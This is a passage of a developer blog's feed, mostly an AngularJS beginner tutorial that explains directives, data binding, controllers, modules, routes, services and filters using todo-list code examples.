Is NOT working? take a look at the <a href="https://github.com/amejiarosario/todoAPIjs" target="_blank" rel="noopener">full repository</a>.</p>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Connecting AngularJS with this endpoint. Check out the <a href="/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs">third</a> tutorial in this series.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to this tutorial about RESTful API using Node.js (Express.js) and MongoDB (mongoose)! We are going to learn how to install and use each component individually and then proceed to create a RESTful API.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="NodeJS" scheme="https://adrianmejia.com/tags/NodeJS/"/>
    
      <category term="Tutorial_MEAN-Stack" scheme="https://adrianmejia.com/tags/Tutorial-MEAN-Stack/"/>
    
      <category term="ExpressJS" scheme="https://adrianmejia.com/tags/ExpressJS/"/>
    
      <category term="MongoDB" scheme="https://adrianmejia.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>AngularJS tutorial for beginners with NodeJS ExpressJS and MongoDB (Part I)</title>
    <link href="https://adrianmejia.com/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/"/>
    <id>https://adrianmejia.com/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/</id>
    <published>2014-09-29T03:50:24.000Z</published>
    <updated>2016-08-06T23:31:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>This tutorial is meant to be as clear as possible. At the same time, we are going to cover the concepts that you will need most of the time. All the good stuff without the fat :)</p>
<a id="more"></a>
<p>MEAN Stack tutorial series:</p>
<ol>
<li>AngularJS tutorial for beginners (Part I) <strong>üëà you are here</strong></li>
<li><a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/">Creating RESTful APIs with NodeJS and MongoDB Tutorial (Part II)</a></li>
<li><a href="/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/">MEAN Stack Tutorial: MongoDB, ExpressJS, AngularJS and NodeJS (Part III)</a></li>
</ol>
<p>We are going to start building all the examples in a single HTML file! It embedded JavaScript and NO styles/CSS for <strong>simplicity</strong>. Don‚Äôt worry, in the next tutorials, we will learn how to split use Angular modules. We are going to break down the code, add testing to it and styles.</p>
<h1 id="What-is-Angular-js">What is Angular.js?<a href="#What-is-Angular-js" class="headerlink" title="What is Angular.js?"></a></h1><p>Angular.js is a MVW (Model-View-Whatever) open-source JavaScript web framework that facilitates the creation of single-page applications (SPA) and data-driven apps.</p>
<h2 id="AngularJS-vs-jQuery-vs-BackboneJS-vs-EmberJS">AngularJS vs jQuery vs BackboneJS vs EmberJS<a href="#AngularJS-vs-jQuery-vs-BackboneJS-vs-EmberJS" class="headerlink" title="AngularJS vs jQuery vs BackboneJS vs EmberJS"></a></h2><p><a href="#start">TL; DR</a>: AngularJS is awesome for building testable single page applications (SPA). Also, excel with data-driven and CRUD apps. <a href="#start">Show me the code!.</a></p>
<p>AngularJS motto is</p>
<blockquote>
<p>HTML enhanced for web apps!</p>
</blockquote>
<p>It extends standard HTML tags and properties to bind events and data into it using JavaScript. It has a different approach to other libraries. jQuery, Backbone.Js, Ember.js and similar‚Ä¶ they are more leaned towards ‚ÄúUnobtrusive JavaScript‚Äù.</p>
<p>Traditional JavaScript frameworks, use IDs and classes in the elements. That gives the advantage of separating structure (HTML) from behavior (Javascript). Yet, it does not do any better on code complexity and readability. Angular instead declares the event handlers right in the element that they act upon.</p>
<p>Times have changed since then. Let‚Äôs examine how AngularJS tries to ease code complexity and readability:</p>
<ul>
<li><strong>Unit testing</strong> ready: JavaScript is, usually, hard to unit test. When you have DOM manipulations and business logic together (e.g. jQuery based code). AngularJS keeps DOM manipulation in the HTML and business logic separated. Data and dependencies are <code>$injected</code> as needed.</li>
<li><strong>DOM manipulation</strong> where they are used. It decouples DOM manipulation from application logic.</li>
<li>AngularJS is also excellent for <strong>single-page applications (SPA)</strong>.</li>
<li>Different <strong>browsers implement</strong> features differently, but fret not. Angular‚Äôs directive (or HTML extensions) take care of the differences for you.</li>
<li><strong>Global namespace</strong> expressions and methods definitions are scoped within controllers. So, they do not pollute the global namespace.</li>
<li><strong>Data models</strong> are plain old JavaScript objects (POJO).</li>
<li>Write less code: AngualarJS features save you from much boilerplate code.</li>
<li>AngularJS provides solutions for writing modular code and dependencies management.</li>
</ul>
<p>Without further ado, let‚Äôs dive in!</p>
<p><a id="start"></a></p>
<h1 id="AngularJS-Main-Components">AngularJS Main Components<a href="#AngularJS-Main-Components" class="headerlink" title="AngularJS Main Components"></a></h1><p>AngularJS has an <a href="https://docs.angularjs.org/api" target="_blank">extensive API</a> and components. In this tutorial we are going to focus on the most important ones, such as directives, modules, services, controllers and related concepts.</p>
<h2 id="AngularJS-Directives">AngularJS Directives<a href="#AngularJS-Directives" class="headerlink" title="AngularJS Directives"></a></h2><p>The first concept you need to know about AngularJS is what are directives.</p>
<p><strong>Directives</strong> are extensions of HTML markups. They could take the form of attributes, element names, CSS class and or even HTML comments. When the AngularJS framework is loaded, everything inside <code>ng-app</code> it‚Äôs compiled. The directives are bound to data, events, and DOM transformations.</p>
<p>Notice in the following example that there are two directives: ng-app and ng-model.</p>
<p>Notice in the following example that there are two directives: <code>ng-app</code> and <code>ng-model</code>.</p>
<figure class="highlight html"><figcaption><span>Hello World in AngularJS</span><a href="http://codepen.io/amejiarosario/pen/KdLaq" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World in AngularJS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">ng-model</span>=<span class="string">"name"</span>&gt;</span> Hello &#123;&#123; name &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.25/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We going to learn about some of the main built-in directives as we go:</p>
<ul>
<li><p><strong>ng-app</strong>: is a directive that bootstraps AngularJS. It designates the caller element as the root. It‚Äôs usually placed on <code>&lt;html&gt;</code> or <code>&lt;body&gt;</code>.</p>
</li>
<li><p><strong>ng-model</strong>: is a directive that binds usually form elements. For instance, <code>input</code>, <code>select</code>, <code>checkboxes</code>, <code>textarea</code>. They keep data (model) and visual elements (HTML) in sync.</p>
</li>
<li><p><strong>{{ name }}</strong> <code>{{ }}</code> are a way of binding models to elements in HTML. In the example above, the <code>ng-model</code> name is bound to the placeholder <code>{{ name }}</code>. Play with the example below to see how the placeholder is updated real-time to whatever you type in the textbox.</p>
</li>
</ul>
<p>Data binding AngularJS example:</p>
<p data-height="268" data-theme-id="0" data-slug-hash="KdLaq" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/KdLaq/" target="_blank" rel="noopener">KdLaq</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<p>You can create your own directives. Checkout the this tutorial for more: <a href="/blog/2016/04/08/creating-custom-angularjs-directives-for-beginners/">creating-custom-angularjs-directives-for-beginners</a>. It will go deeper into directives.</p>
<h2 id="AngularJS-Data-Binding">AngularJS Data Binding<a href="#AngularJS-Data-Binding" class="headerlink" title="AngularJS Data Binding"></a></h2><p><strong>Data binding</strong> is an AngularJS feature that synchronizes your model data with your HTML. That‚Äôs great because models are the ‚Äúsingle source of truth‚Äù. You do not have to worry about updating them. Here‚Äôs a graph from <a href="http://docs.angularjs.org" target="_blank">docs.angularjs.org</a>.</p>
<img src="/images/Two_Way_Data_Binding.png" title="Two Data Binding in Angular Templates">
<p>Whenever the HTML is changed, the model gets updated. Wherever the model gets updated it is reflected in HTML.</p>
<h2 id="AngularJS-Scope">AngularJS Scope<a href="#AngularJS-Scope" class="headerlink" title="AngularJS Scope"></a></h2><p><code>$scope</code> it is an object that contains all the data to which HTML is bound. They are the glue your javascript code (controllers) and the view (HTML). Everything that is attached to the <code>$scope</code>, it is  <code>$watch</code>ed by AngularJS and updated.</p>
<p>Scopes can be bound to javascript functions. Also, you could have more than one <code>$scope</code> and inherit from outer ones. More on this, in the controller‚Äôs section.</p>
<h2 id="AngularJS-Controllers">AngularJS Controllers<a href="#AngularJS-Controllers" class="headerlink" title="AngularJS Controllers"></a></h2><p>Angular.js <strong>controllers</strong> are code that ‚Äúcontrols‚Äù certain sections containing DOM elements. They encapsulate the behavior, callbacks and glue <code>$scope</code> models with views. Let‚Äôs see an example to drive the concept home:</p>
<figure class="highlight html"><figcaption><span>AngularJS Controller Example</span><a href="http://codepen.io/amejiarosario/pen/spuCm" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">ng-controller</span>=<span class="string">"TodoController"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in todos"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span></span><br><span class="line">      &#123;% raw  %&#125;&#123;&#123; todo.name &#125;&#125;&#123;% endraw %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">TodoController</span>(<span class="params">$scope</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">      $scope.todos = [</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Master HTML/CSS/Javascript'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Learn AngularJS'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Build NodeJS backend'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Get started with ExpressJS'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Setup MongoDB database'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="javascript">        &#123; <span class="attr">name</span>: <span class="string">'Be awesome!'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="undefined">      ]</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>AngularJS controller interactive example:</p>
<p data-height="268" data-theme-id="0" data-slug-hash="spuCm" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/spuCm/" target="_blank" rel="noopener">spuCm</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<p>As you might notice we have new friends: <code>ng-controller</code>, <code>ng-repeat</code> and <code>$scope</code>.</p>
<ul>
<li><p><strong><code>ng-controller</code></strong> is a directive that tells angular what function controller to use for a particular view. Every time AngularJS loads, it reads the <code>ng-controller</code> argument (in this case ‚ÄúTodoController‚Äù). Then, it will look for a function in plain old javascript object (POJO) with the same name or for <code>angular.controller</code> matching name.</p>
</li>
<li><p><strong><code>$scope</code></strong> As mentioned earlier <code>$scope</code>‚Äòs are the glue between the data models in the controllers and the views. Take a look to our ‚ÄúTodoController‚Äù it has a parameter named <code>$scope</code>. AngularJS is going to pass (<code>$inject</code>) that parameter, and whatever you attach to it, it will be available in the view. In this example is the particular is the <code>todos</code> array of objects.</p>
</li>
<li><p><strong><code>ng-repeat</code></strong> as its name implies, it is going to ‚Äúrepeat‚Äù the element and sub-elements where this directive is declared. It is going to iterate for each element in the <code>$scope.todos</code> array.</p>
</li>
<li><p><strong><code>ng-model</code></strong> notice that the checkbox is bound to the <code>todo.completed</code>. If <code>todo.completed</code> is true, then the checkbox is going to be checked and vice versa.</p>
</li>
</ul>
<h2 id="AngularJS-Modules">AngularJS Modules<a href="#AngularJS-Modules" class="headerlink" title="AngularJS Modules"></a></h2><p>Modules are a way to encapsulate different parts of your application. They allow reusing code in other places.  Here‚Äôs an example of how to rewrite our controller using modules.</p>
<figure class="highlight javascript"><figcaption><span>AngularJS Module Example</span><a href="http://codepen.io/amejiarosario/pen/spuCm" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">angular.module(<span class="string">'app'</span>, [])</span><br><span class="line">  .controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">    $scope.todos = [</span><br><span class="line">      &#123; <span class="attr">title</span>: <span class="string">'Learn Javascript'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">title</span>: <span class="string">'Learn Angular.js'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">title</span>: <span class="string">'Love this tutorial'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">title</span>: <span class="string">'Learn Javascript design patterns'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">title</span>: <span class="string">'Build Node.js backend'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    ];</span><br><span class="line">  &#125;]);</span><br></pre></td></tr></table></figure>
<p>Notice the <code>&lt;html ng-app=&quot;app&quot;&gt;</code> in the example below</p>
<p data-height="268" data-theme-id="0" data-slug-hash="uFfqG" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/uFfqG/" target="_blank" rel="noopener">uFfqG</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<p>Using modules brings many advantages. They can be loaded in any order, and parallel dependency loading. Also, tests can only load the required modules and keep it fast, clear view of the dependencies.</p>
<h2 id="AngularJS-Templates">AngularJS Templates<a href="#AngularJS-Templates" class="headerlink" title="AngularJS Templates"></a></h2><p>Templates contain HTML and Angular elements (directives, markup, filters or form controls). They can be cached and referenced by an id.</p>
<p>Here‚Äôs an example:</p>
<figure class="highlight html"><figcaption><span>AngularJS Template Example</span><a href="https://gist.github.com/amejiarosario/eebd176cb1796769ec2b" target="_blank" rel="noopener">download</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/ng-template"</span> <span class="attr">id</span>=<span class="string">"/todos.html"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in todos"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span></span></span><br><span class="line"><span class="undefined">      &#123;&#123; todo.name &#125;&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Does the code inside looks familiar? ;)</p>
<p>Notice they are inside the <code>script</code> and has a type of <code>text/ng-template</code>.</p>
<h2 id="AngularJS-Routes-ngRoutes">AngularJS Routes (ngRoutes)<a href="#AngularJS-Routes-ngRoutes" class="headerlink" title="AngularJS Routes (ngRoutes)"></a></h2><p>ngRoutes module allows changing what we see in the app depending on the URL (route). It, usually, uses templates to inject the HTML into the app.</p>
<p>It does not come with AngularJS core module, so we have to list it as a dependency. We are going to get it from Google CDN:</p>
<p><code>&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.25/angular-route.min.js&quot;&gt;&lt;/script&gt;</code></p>
<p><strong>NEW FEATURE</strong>: add notes to the todo tasks. Let‚Äôs start with the routes!</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">angular.module(<span class="string">'app'</span>, [<span class="string">'ngRoute'</span>])</span><br><span class="line">  .config([<span class="string">'$routeProvider'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$routeProvider</span>) </span>&#123;</span><br><span class="line">    $routeProvider</span><br><span class="line">      .when(<span class="string">'/'</span>, &#123;</span><br><span class="line">        templateUrl: <span class="string">'/todos.html'</span>,</span><br><span class="line">        controller: <span class="string">'TodoController'</span></span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;]);</span><br></pre></td></tr></table></figure>
<p data-height="268" data-theme-id="0" data-slug-hash="CmnFH" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/CmnFH/" target="_blank" rel="noopener">CmnFH</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<ul>
<li><p>First notice that we removed <code>ng-controller=&quot;TodoController&quot;</code> from the body tag. The controllers are now called based on the route.</p>
</li>
<li><p><code>ngView</code> is a directive used by <code>$routeProvider</code> to render HTML into it. Every time the URL changes, it will inject a new HTML template and controller into ngView.</p>
</li>
</ul>
<h2 id="AngularJS-Services-Factories">AngularJS Services (Factories)<a href="#AngularJS-Services-Factories" class="headerlink" title="AngularJS Services (Factories)"></a></h2><p>Notice that if you want to create a 2nd controller and share $scope.todos it is not possible right now. That is when services become handy. Services are a way to inject data dependencies into controllers. They are created through factories. Let‚Äôs see it in action:</p>
<figure class="highlight javascript"><figcaption><span>AngularJS Service Factory Example</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">angular.module(<span class="string">'app'</span>, [<span class="string">'ngRoute'</span>])</span><br><span class="line"></span><br><span class="line">  .factory(<span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'AngularJS Directives'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Data binding'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'$scope'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Controllers and Modules'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Templates and routes'</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Filters and Services'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Get started with Node/ExpressJS'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Setup MongoDB database'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'Be awesome!'</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    ];</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  .controller(<span class="string">'TodoController'</span>, [<span class="string">'$scope'</span>, <span class="string">'Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, Todos</span>) </span>&#123;</span><br><span class="line">    $scope.todos = Todos;</span><br><span class="line">  &#125;])</span><br></pre></td></tr></table></figure>
<p>We are now injecting the data dependency <code>Todo</code> into the controllers. This way we could reuse the data to any controller or module that we need to. This is not only used for static data like the array. But we could also do server calls using <code>$http</code> or even RESTful  <code>$resource</code>.</p>
<p>Let‚Äôs say we want to show the details of the task when we click on it. For that, we need to create a 2nd controller, template, and route that uses this service:</p>
<p data-height="268" data-theme-id="0" data-slug-hash="pGkhg" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/pGkhg/" target="_blank" rel="noopener">pGkhg</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>


<p>(NOTE: Click on the links and it will take you to the todo details. Use backspace key to go back to the main menu)</p>
<p>This is what is happening:</p>
<ol>
<li>In the <code>HTML</code> tab, we created a second template <code>/todoDetails.html</code> which contains the todo details we want to show.</li>
<li>Also, in our previous template <code>/todos.html</code> we want to have a link that points to the <code>todo</code> detail. We are using the <code>$index</code> which is the corresponding order number in a <code>ng-repeat</code>.</li>
<li>In the <code>JS</code> tab, we created a new <code>$routeProvider</code> . It points to a new controller <code>TodoDetailCtrl</code> and the template that we created on #1. The <code>:id</code> parameter it is accessible in the controllers through <code>$routeParams</code>.</li>
<li>We Created the new controller <code>TodoDetailCtrl</code>. Also, we injected the dependencies which are <code>$scope</code>, <code>Todos</code> (factory), and <code>$routeParams</code> which will have the <code>id</code> param.</li>
<li>Set the <code>$scope</code> in the new controller. Instead of using the whole array, we are going to select only the one that we need using the <code>id</code> that we set in step #2.</li>
</ol>
<p>NOTE: in codepen, you will not see the URL. If you want to see it changing, you can download the whole example an open it from <a href="https://gist.github.com/amejiarosario/f0a82c7a0eec4786f1c9" target="_blank">here</a>.</p>
<h2 id="AngularJS-Filters">AngularJS Filters<a href="#AngularJS-Filters" class="headerlink" title="AngularJS Filters"></a></h2><p>Filters allow you to format and transform data. They change the output of expressions inside the curly braces. AngularJS comes with a bunch of useful filters.</p>
<p><strong>Built-in Filters</strong>:</p>
<ul>
<li><em>filter</em>: search for a given string in an array and return matches.</li>
<li><em>Number</em>: adds comma-separated 1000‚Äôs and two decimal places.</li>
<li><em>Currency</em>: the same as <em>Number</em> and adds a $ in front.</li>
<li><em>Date</em>: takes a Unix timestamp (e.g. 1288323623006) or date string and output it in the format that you specify (e.g. ‚ÄòlongDate‚Äô or fragments ‚Äòyyyy‚Äô for a four-digit year). For a full list see <a href="https://docs.angularjs.org/api/ng/filter/date" target="_blank">here</a>.</li>
<li><em>JSON</em>: converts javascript objects to JSON strings.</li>
<li><em>lowercase</em>/<em>uppercase</em>: converts strings to lowercase/uppercase.</li>
<li><em>limitTo</em>: number of elements from an array to show.</li>
<li><em>orderBy</em>: order array of objects by a key that you specify.</li>
</ul>
<p><strong>Note</strong> you can also chain many filters and also define your own filters.</p>
<p data-height="268" data-theme-id="0" data-slug-hash="tyuDK" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/tyuDK/" target="_blank" rel="noopener">tyuDK</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<blockquote>
<p><strong>NEW FEATURE</strong>: Search todo tasks by name. Let‚Äôs use a filter to solve that problem.</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/ng-template"</span> <span class="attr">id</span>=<span class="string">"/todos.html"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  Search: <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ng-model</span>=<span class="string">"search.name"</span>&gt;</span></span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in todos | filter: search"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/&#123;&#123;$index&#125;&#125;"</span>&gt;</span>&#123;&#123;todo.name&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Notice that we are using <code>search.name</code> in the <code>ng-model</code> for search. That will limit the search to the <code>name</code> attribute and <code>search.notes</code> will look inside the notes only. Guest what <code>search</code> would do then? Precisely! It searches in all the attributes. Fork the following example and try it out:</p>
<p data-height="268" data-theme-id="0" data-slug-hash="ahwbz" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/ahwbz/" target="_blank" rel="noopener">ahwbz</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

